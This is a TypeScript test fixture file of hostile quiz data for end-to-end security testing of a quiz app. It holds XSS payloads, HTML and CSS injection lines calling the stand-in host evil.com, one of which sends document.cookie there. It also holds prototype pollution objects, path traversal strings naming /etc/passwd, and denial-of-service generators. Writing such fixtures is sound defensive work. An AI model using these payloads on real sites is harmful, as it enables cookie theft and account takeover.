/**
 * E2E Test Fixtures - Malicious Data for Security Testing
 */

// ============================================
// XSS ATTACK PAYLOADS
// ============================================

export const xssScriptTag = {
  name: '<script>alert("XSS")</script>Test Quiz',
  description: 'Quiz with XSS in description <script>evil()</script>',
  chapters: [
    {
      id: 'ch1',
      title: '<script>document.cookie</script>',
      questions: [
        {
          questionId: 'xss-q1',
          questionText: '<script>alert("question XSS")</script>What is 1+1?',
          options: [{ optionId: 'xss-a', optionText: '<script>alert("option")</script>2' }],
          correctOptionIds: ['xss-a'],
          explanation: '<script>alert("explanation")</script>',
        },
      ],
    },
  ],
};

export const xssEventHandlers = {
  name: 'Event Handler XSS Quiz',
  chapters: [
    {
      id: 'ch1',
      title: 'XSS Chapter',
      questions: [
        {
          questionId: 'event-q1',
          questionText: '<img src="x" onerror="alert(1)">Question with img onerror',
          options: [
            { optionId: 'evt-a', optionText: '<div onmouseover="alert(1)">Hover me</div>' },
            { optionId: 'evt-b', optionText: '<a onclick="alert(1)">Click me</a>' },
            { optionId: 'evt-c', optionText: '<input onfocus="alert(1)" autofocus>' },
          ],
          correctOptionIds: ['evt-a'],
          explanation: '<svg onload="alert(1)">SVG XSS</svg>',
        },
      ],
    },
  ],
};

export const xssJavascriptUrls = {
  name: 'JavaScript URL XSS Quiz',
  chapters: [
    {
      id: 'ch1',
      title: 'URL XSS',
      questions: [
        {
          questionId: 'url-q1',
          questionText: 'Click [here](javascript:alert(1)) for more info',
          options: [
            {
              optionId: 'url-a',
              optionText: '[Link](javascript:void(document.location="evil.com"))',
            },
          ],
          correctOptionIds: ['url-a'],
          explanation: 'See [details](javascript:alert(document.cookie))',
        },
      ],
    },
  ],
};

export const xssSvgContent = {
  name: 'SVG XSS Quiz',
  chapters: [
    {
      id: 'ch1',
      title: 'SVG Chapter',
      questions: [
        {
          questionId: 'svg-q1',
          questionText: '<svg><script>alert(1)</script></svg>Question',
          options: [{ optionId: 'svg-a', optionText: '<svg onload="alert(1)"></svg>' }],
          correctOptionIds: ['svg-a'],
          explanation: '<svg><foreignObject><script>alert(1)</script></foreignObject></svg>',
        },
      ],
    },
  ],
};

// ============================================
// HTML INJECTION
// ============================================

export const htmlInjection = {
  name: 'HTML Injection Quiz',
  chapters: [
    {
      id: 'ch1',
      title: 'HTML Injection',
      questions: [
        {
          questionId: 'html-q1',
          questionText: '<form action="https://evil.com/steal"><input name="data"></form>',
          options: [
            { optionId: 'html-a', optionText: '<iframe src="https://evil.com"></iframe>' },
            {
              optionId: 'html-b',
              optionText: '<object data="https://evil.com/malware.swf"></object>',
            },
            { optionId: 'html-c', optionText: '<embed src="https://evil.com/evil.js">' },
          ],
          correctOptionIds: ['html-a'],
          explanation: '<meta http-equiv="refresh" content="0;url=https://evil.com">',
        },
      ],
    },
  ],
};

// ============================================
// CSS INJECTION
// ============================================

export const cssInjection = {
  name: 'CSS Injection Quiz',
  chapters: [
    {
      id: 'ch1',
      title: 'CSS Injection',
      questions: [
        {
          questionId: 'css-q1',
          questionText:
            '<style>body{background:url("https://evil.com/track?data="+document.cookie)}</style>',
          options: [
            {
              optionId: 'css-a',
              optionText: '<div style="background:url(javascript:alert(1))">Styled</div>',
            },
          ],
          correctOptionIds: ['css-a'],
          explanation: '<link rel="stylesheet" href="https://evil.com/evil.css">',
        },
      ],
    },
  ],
};

// ============================================
// PROTOTYPE POLLUTION
// ============================================

export const prototypePollution = {
  name: 'Normal Quiz',
  __proto__: {
    isAdmin: true,
    polluted: true,
  },
  constructor: {
    prototype: {
      isAdmin: true,
    },
  },
  chapters: [
    {
      id: 'ch1',
      title: 'Chapter',
      __proto__: { polluted: true },
      questions: [
        {
          questionId: 'proto-q1',
          questionText: 'Question',
          __proto__: { evil: true },
          options: [{ optionId: 'a', optionText: 'A', __proto__: {} }],
          correctOptionIds: ['a'],
        },
      ],
    },
  ],
};

// ============================================
// PATH TRAVERSAL
// ============================================

export const pathTraversal = {
  name: '../../../etc/passwd',
  chapters: [
    {
      id: '../../secrets',
      title: '../config/database.yml',
      questions: [
        {
          questionId: '..\\..\\windows\\system32',
          questionText: 'Path traversal in question ID',
          options: [{ optionId: 'a', optionText: 'A' }],
          correctOptionIds: ['a'],
        },
      ],
    },
  ],
};

// ============================================
// MALFORMED JSON
// ============================================

export const malformedJsonStrings = [
  '{ not valid json }',
  '{"unclosed": "string',
  '{"trailing": "comma",}',
  '[1, 2, 3,]',
  '{"nested": {"deep": {"very": }}}',
  'null',
  'undefined',
  '',
  '   ',
  '\n\n\n',
];

// ============================================
// DENIAL OF SERVICE ATTEMPTS
// ============================================

export function generateDeeplyNested(depth: number): string {
  let json = '{"a":';
  for (let i = 0; i < depth; i++) {
    json += '{"b":';
  }
  json += '"deep"';
  for (let i = 0; i < depth; i++) {
    json += '}';
  }
  json += '}';
  return json;
}

export function generateRegexBomb(): object {
  return {
    name: 'a]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]',
    chapters: [
      {
        id: 'ch1',
        title: 'Chapter',
        questions: [
          {
            questionId: 'regex-bomb',
            // ReDoS attempt
            questionText:
              'aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa!',
            options: [{ optionId: 'a', optionText: 'A' }],
            correctOptionIds: ['a'],
          },
        ],
      },
    ],
  };
}

// ============================================
// HELPER: Get all malicious quizzes
// ============================================

export function getAllMaliciousQuizzes() {
  return [
    { name: 'XSS Script Tag', data: xssScriptTag },
    { name: 'XSS Event Handlers', data: xssEventHandlers },
    { name: 'XSS JavaScript URLs', data: xssJavascriptUrls },
    { name: 'XSS SVG Content', data: xssSvgContent },
    { name: 'HTML Injection', data: htmlInjection },
    { name: 'CSS Injection', data: cssInjection },
    { name: 'Prototype Pollution', data: prototypePollution },
    { name: 'Path Traversal', data: pathTraversal },
  ];
}
